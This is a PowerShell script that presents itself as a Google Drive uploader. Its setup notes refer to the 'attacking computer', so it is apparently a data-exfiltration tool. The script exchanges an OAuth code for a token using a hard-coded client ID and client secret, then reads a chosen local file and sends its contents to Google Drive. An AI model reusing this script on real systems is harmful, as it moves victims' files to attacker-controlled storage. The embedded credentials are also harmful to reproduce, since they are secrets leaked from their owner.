<#

.SYNOPSIS
This is a Powershell script to upload a file to Google Drive using their REST API.

.DESCRIPTION
This Powershell script will upload file to Google Drive using their REST API with the parameters you provide.
Please Note, the script only uploads the content of the file and Not its MetaData.

.PARAMETER SourceFilePath
The path of the file to upload.

.PARAMETER DriveAccessToken
The GoogleDrive access token.


----------------TO BE REMOVED ------------------------
To generate Access tokens setup OAuth2 credentials [Client Id, Client Secret, Redirect URI] on Google Account.
1. On attacking computer. Go to Url in browser-
   https://accounts.google.com/o/oauth2/auth?client_id=<CLIENT_ID>&scope=https://www.googleapis.com/auth/drive&response_type=code&redirect_uri=<REDIRECT_URI>
2. Login if necessary
   <<Redirects to url of format - "http://localhost/oauth2callback?code=4/rZdbtgiL6A5BHJUFhdOKrnSYFhbW4d1GMaMkkL31TWk#">>
3. Copy value of code without trailing '#' from URL
------------------------------------------------------
#>

Param(
    [Parameter(Mandatory=$true)]
    [string]$SourceFilePath,
    [Parameter(Mandatory=$true)]
    [string]$AccessToken
)

$load_lib = [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions");

<#----------------INITIALIZATION REQUIRED-----------------#>
$ClientID = '740191562411-pobceqj1drk90ua2j76fl08r95vl2cl5.apps.googleusercontent.com';
$ClientSecret = 'LK1DekHM0oVcQYdd9dGLjcFJ';
$CallbackURI = 'http://localhost/oauth2callback'
<#--------------------------------------------------------#>

$WebRequest = [System.Net.WebRequest]::Create("https://www.googleapis.com/oauth2/v4/token");
$WebRequest.Method = "POST";
$WebRequest.ContentType = "application/x-www-form-urlencoded";

$RequestWriter = [System.IO.StreamWriter] $WebRequest.GetRequestStream();
$RequestWriter.Write("code="+$AccessToken+"&client_id="+$ClientID+"&client_secret="+$ClientSecret+"&redirect_uri="+$CallbackURI+"&grant_type=authorization_code");
$RequestWriter.Close();

$ResponseReader = New-Object System.IO.StreamReader $WebRequest.GetResponse().GetResponseStream();
$tokens = $ResponseReader.ReadToEnd();

$ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer;
$tok = $ser.DeserializeObject($tokens);

$authorization = "Bearer "+ $tok.access_token

$WebRequest1 = [System.Net.WebRequest]::Create("https://www.googleapis.com/upload/drive/v3/files?uploadType=media");
$WebRequest1.Method = "POST";
$WebRequest1.ContentType = "application/octet-stream";
$WebRequest1.Headers.add('Authorization',$authorization);


$FileReader = New-Object System.IO.StreamReader ($SourceFilePath, [System.Text.Encoding]::Default);
$RequestWriter1 = New-Object System.IO.StreamWriter ($WebRequest1.GetRequestStream(), [System.Text.Encoding]::Default);
$RequestWriter1.Write($FileReader.ReadToEnd());
$RequestWriter1.Close();

$ResponseReader1 = New-Object System.IO.StreamReader $WebRequest1.GetResponse().GetResponseStream();
$ResponseReader1.ReadToEnd();
